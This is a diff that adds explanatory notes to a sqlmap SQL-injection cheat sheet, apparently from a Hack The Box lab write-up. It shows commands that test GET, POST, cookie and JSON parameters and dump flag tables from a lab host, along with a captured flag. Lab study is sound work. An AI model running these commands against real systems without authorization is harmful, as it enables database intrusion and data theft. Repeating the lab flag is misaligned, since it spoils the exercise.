@@ -8,6 +8,7 @@
 ```bash
 sqlmap -u "http://TARGET/vuln.php?id=1" --batch
 ```
+> Scans a GET parameter. Replace the URL and parameter value with your target's. `--batch` runs non-interactively.
 
 ### POST parameter
 ```bash
@@ -17,6 +18,7 @@ sqlmap -u "http://TARGET/page.php" --data="id=1&name=test" -p id --batch
 # Or mark with asterisk:
 sqlmap -u "http://TARGET/page.php" --data="id=1*&name=test" --batch
 ```
+> Sends injection payloads in the POST body. `-p id` limits testing to the `id` parameter so sqlmap doesn't waste time on others. The asterisk in `id=1*` does the same thing inline. Replace the URL and parameter names with your target's values.
 
 ### Cookie value
 ```bash
@@ -37,7 +39,9 @@ sqlmap -u "http://TARGET/page.php" --data='{"id":1}' --no-cast --batch
 sqlmap -r req.txt --batch
 # Mark injection point with * in the file: /?id=* or id=1*
 ```
-Copy as cURL from browser DevTools → replace `curl` with `sqlmap` → works directly.
+> Feeds a raw HTTP request to sqlmap. Save the request from Burp (right-click → Save item) or DevTools. Edit the file to add `*` where you want injection tested. This handles headers, cookies, and complex bodies automatically.
+
+In your browser's developer tools (DevTools), you can copy any request as a cURL command. Replace `curl` with `sqlmap` and it runs as-is.
 
 ---
 
@@ -69,6 +73,7 @@ sqlmap -u "http://154.57.164.72:30732/case2.php" \
   --dbms=mysql --batch --technique=U \
   --dump -T flag2
 ```
+> POST injection targeting the `id` parameter. `--technique=U` forces UNION-only mode for speed. `-T flag2` dumps the specific table directly. Replace the IP, port, path, and table name for other targets.
 
 **flag2:** `HTB{700_much_c0n6r475_0n_p057_r3qu357}`
 
@@ -82,6 +87,7 @@ sqlmap -u "http://154.57.164.72:30732/case3.php" \
   --dbms=mysql --batch --level=2 \
   --dump -T flag3
 ```
+> Cookie-based injection. `--cookie="id=1"` provides the cookie value to test. `--level=2` is required — sqlmap skips cookies at the default level 1. `-p id` limits testing to the `id` cookie parameter.
 
 > `--level=2` required — sqlmap ignores cookies at level 1.
 
@@ -97,6 +103,7 @@ sqlmap -u "http://154.57.164.72:30732/case4.php" \
   --dbms=mysql --batch --no-cast \
   --dump -T flag4
 ```
+> JSON body injection. sqlmap auto-detects the JSON content type. `--no-cast` is required because UNION data retrieval often silently fails on JSON targets without it. Replace the IP, port, path, and table name for other targets.
 
 > `--no-cast` needed — UNION retrieval fails without it on JSON targets.
 
